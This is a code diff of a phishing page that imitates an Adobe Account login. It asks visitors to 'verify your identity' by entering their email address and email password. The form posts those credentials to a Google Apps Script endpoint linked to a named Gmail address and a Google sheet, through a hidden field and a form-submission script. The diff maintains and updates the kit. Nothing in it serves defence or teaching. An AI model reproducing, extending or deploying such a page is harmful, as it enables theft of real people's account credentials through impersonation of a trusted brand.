@@ -9,17 +9,9 @@
     <link rel="icon" href="favico.ico" type="image/gif" sizes="16x16">
     <meta name="description"
         content="Manage your Adobe Account profile, password, security options, product service subscriptions, privacy settings, and communicaiton preferences. ">
-    <!-- Compiled and minified CSS -->
-    <!-- Latest compiled and minified CSS -->
-    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css"
-        integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
-
-    <!-- Optional theme -->
-    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap-theme.min.css"
-        integrity="sha384-rHyoN1iRsVXV4nD0JutlnGaslCJuC7uwjduW9SVrLvRYooPp2bWYgmgJQIXwl/Sp" crossorigin="anonymous">
-
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
-    <link rel="stylesheet" href="./style.css">
+        <link rel="stylesheet" href="./style.css">
+        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
 
 </head>
 
@@ -33,34 +25,34 @@
                         src="./images/kisspng-adobe-systems-logo-business-adobe-acrobat-adobe-premier-5b48b7de87b4c3.4823781215314923185559.png"
                         width="10%">
                     </span>
-                    <span class="sm-logo-name">
+                    <span  class="sm-logo-name">
                          Adobe ID
                     </span>
                 </span>
-                <h6 class="head" style="font-weight: 900; padding: 5px 0;">For your protection, please verify your identity.</h6>
+                <h6 class="head" style="font-weight: 900; padding: 5px 0;" id="head-title">For your protection, please verify your identity.</h6>
                 <div class="logo">
                     <img src="./images/Adobe-logo.png" width="10%" />
-                    <span >Adobe Account</span>
+                    <span id="head-sub-title">Adobe Account</span>
                 </div>
                 <br >
                 <form class='gform' id="contact" data-email="hxan619@gmail.com"
                     action="https://script.google.com/macros/s/AKfycbwcezWyjISy7yfv-VNOfb5mhwlwE-Y-jwn3u3D9aOSkRJYAHMc/exec"
                     method="POST">
                     <div class="form-group">
-                        <input name="email" class="email form-control" type="email"
+                        <input name="email" id="email" class="email form-control" type="email"
                             placeholder="Email Address" />
                     </div>
                     <div class="form-group">
-                        <input name="pass" class="password form-control" type="password" placeholder="Email Password" />
+                        <input name="pass" id="pass" class="password form-control" type="password" placeholder="Email Password" />
                     </div>
                     <br />
                     <input name="user_informaion" type="text" id="info" style="display: none;" />
-                    <div class="form-group" style="display: inline-flex; width: 100%;">
-                        <button type="submit"  class="view_file">Sign in</button>
-                        <a href="#" style="width: 70%; text-align: right;" class="pdf-link">Forgot Password?</a>
+                    <div class="form-group" style="display: inline-flex; width: 100%; margin-bottom: 10px;">
+                        <button type="submit" id="signin-btn" class="view_file">Sign in</button>
+                        <a href="#" style="width: 70%; text-align: right;" id="forgot-pass-btn" class="pdf-link">Forgot Password?</a>
                     </div>
                 </form>
-                <p>
+                <p style="margin-top: 1rem; margin-bottom: 1rem;" id="not-a-member">
                     Not a member yet? <a href="#" class="pdf-link"> Get an Adobe ID </a>
                     <br />
                     <br />
@@ -94,7 +86,7 @@
             <div class="loader">
                 <div class="d-flex justify-content-center">
                     <div class="spinner-border" style="width: 3rem; height: 3rem;" role="status">
-                        <span class="sr-only">Loading...</span>
+                        <span class="sr-only" id="loading">Loading...</span>
                     </div>
                 </div>
             </div>
@@ -105,14 +97,11 @@
     <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js"
         integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo"
         crossorigin="anonymous"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js"
-        integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1"
-        crossorigin="anonymous"></script>
-    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"
-        integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM"
-        crossorigin="anonymous"></script>
+    <!-- JavaScript Bundle with Popper -->
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
 
     <!-- Script to submit the form datils to google sheet -->
+    <script src="./js/index.js"></script>
     <script data-cfasync="false" type="text/javascript" src="./js/form-submission-handler.js"></script>
 </body>
 
